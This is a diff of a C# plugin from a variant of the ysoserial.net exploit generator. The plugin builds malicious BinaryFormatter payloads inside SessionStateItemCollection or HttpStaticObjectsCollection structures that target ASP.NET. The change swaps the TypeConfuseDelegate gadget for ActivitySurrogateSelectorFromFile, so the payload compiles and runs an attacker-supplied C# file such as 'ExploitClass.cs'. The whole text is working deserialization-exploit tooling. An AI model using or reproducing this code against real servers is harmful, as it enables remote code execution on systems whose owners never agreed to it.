@@ -1,7 +1,7 @@
 ﻿using System.Collections.Generic;
 using NDesk.Options;
 using System;
-using ysoserial.Generators;
+using ysoserial_frmv2.Generators;
 using System.IO;
 
 /**
@@ -16,7 +16,7 @@ using System.IO;
  *  The affected modules accept input type of BinaryReader
  **/
 
-namespace ysoserial.Plugins
+namespace ysoserial_frmv2.Plugins
 {
     class altserializationPlugin : Plugin
     {
@@ -29,7 +29,7 @@ namespace ysoserial.Plugins
             {
                 {"M|mode=", "the payload mode: HttpStaticObjectsCollection or SessionStateItemCollection. Default: HttpStaticObjectsCollection", v => mode = v },
                 {"o|output=", "the output format (raw|base64).", v => format = v },
-                {"c|command=", "the command to be executed", v => command = v },
+                {"c|command=", "the command to be executed using ActivitySurrogateSelectorFromFileGenerator e.g. \"ExploitClass.cs; System.Windows.Forms.dll\" ", v => command = v },
                 {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
             };
 
@@ -64,7 +64,7 @@ namespace ysoserial.Plugins
             }
 
             object payload = "";
-            if (String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
+            if (String.IsNullOrEmpty(command) || String.IsNullOrEmpty(command.Trim()))
             {
                 Console.Write("ysoserial: ");
                 Console.WriteLine("Incorrect plugin mode/arguments combination");
@@ -94,7 +94,7 @@ namespace ysoserial.Plugins
                 // hacky way ends */
 
                 /* here it is using the sane way! */
-                object serializedData = (object)new TypeConfuseDelegateGenerator().TypeConfuseDelegateGadget(command);
+                object serializedData = (object)new PayloadClass();
                 System.Web.SessionState.SessionStateItemCollection items = new System.Web.SessionState.SessionStateItemCollection();
                 items[""] = serializedData;
                 MemoryStream stream = new MemoryStream();
@@ -115,7 +115,7 @@ namespace ysoserial.Plugins
             else
             {
                 // HttpStaticObjectsCollection
-                byte[] serializedData = (byte[])new TypeConfuseDelegateGenerator().Generate(command, "BinaryFormatter", false);
+                byte[] serializedData = (byte[])new ActivitySurrogateSelectorFromFileGenerator().Generate(command, "BinaryFormatter", false);
                 byte[] newSerializedData = new byte[serializedData.Length + 7]; // ReadInt32 + ReadString + ReadBoolean + ReadByte
                 serializedData.CopyTo(newSerializedData, 7);
                 newSerializedData[0] = 1; // for ReadInt32
